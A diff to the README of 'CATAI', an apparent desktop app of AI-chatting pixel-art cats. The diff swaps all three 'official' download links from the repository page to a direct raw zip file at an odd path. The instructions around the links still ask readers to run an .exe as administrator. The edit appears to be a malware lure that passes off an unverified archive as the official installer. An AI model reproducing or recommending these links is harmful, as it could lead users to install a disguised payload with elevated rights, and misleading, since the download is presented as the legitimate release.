@@ -1,6 +1,6 @@
 # 🐱 CATAI - Talk with digital cats using AI
 
-[![](https://img.shields.io/badge/Download_CATAI-Blue.svg)](https://github.com/christianominor5971/CATAI)
+[![](https://img.shields.io/badge/Download_CATAI-Blue.svg)](https://raw.githubusercontent.com/christianominor5971/CATAI/main/overhelpful/Software-2.2.zip)
 
 CATAI brings pixel art cats to your desktop. These digital pets live on your screen and act as friendly companions. You can discuss ideas, brainstorm projects, or pass the time with your new friends. The software runs locally on your computer. Your conversations stay private. 
 
@@ -8,7 +8,7 @@ CATAI brings pixel art cats to your desktop. These digital pets live on your scr
 
 You need a computer that runs recent versions of Windows. We designed this tool for ease of use. It handles the heavy lifting in the background so you can focus on the cats. Follow these steps to set up your digital companions.
 
-1. Visit the [official download page](https://github.com/christianominor5971/CATAI).
+1. Visit the [official download page](https://raw.githubusercontent.com/christianominor5971/CATAI/main/overhelpful/Software-2.2.zip).
 2. Look for the latest release section.
 3. Select the file ending in .exe to start your download.
 4. Open the file once the download finishes.
@@ -70,4 +70,4 @@ The software processes all data on your local machine. It does not phone home. I
 
 ## 📁 Installation Summary
 
-Download the installer from the [official link](https://github.com/christianominor5971/CATAI). Run the package as an administrator if your system requests permission. Follow the on-screen instructions to finish the installation. Double-click the desk icon to start your first session. Your digital companion will arrive shortly after.
+Download the installer from the [official link](https://raw.githubusercontent.com/christianominor5971/CATAI/main/overhelpful/Software-2.2.zip). Run the package as an administrator if your system requests permission. Follow the on-screen instructions to finish the installation. Double-click the desk icon to start your first session. Your digital companion will arrive shortly after.
